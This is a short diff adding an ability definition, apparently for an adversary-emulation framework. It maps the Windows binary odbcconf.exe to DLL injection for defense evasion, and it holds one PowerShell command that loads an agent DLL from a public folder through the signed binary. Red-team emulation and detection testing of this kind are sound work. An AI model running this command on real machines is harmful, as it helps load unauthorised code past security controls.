@@ -1,0 +1,14 @@
+---
+
+- id: a74bc239-a196-4f7e-8d5c-fe8c0266071c
+  name: Signed Binary Execution - odbcconf
+  description: Leverage odbcconf for DLL injection
+  tactic: defense-evasion
+  technique:
+    attack_id: T1055.001
+    name: "Process Injection: Dynamic-link Library Injection"
+  platforms:
+    windows:
+      psh:
+        command: |
+            odbcconf.exe /S /A {REGSVR "C:\Users\Public\sandcat.dll"}
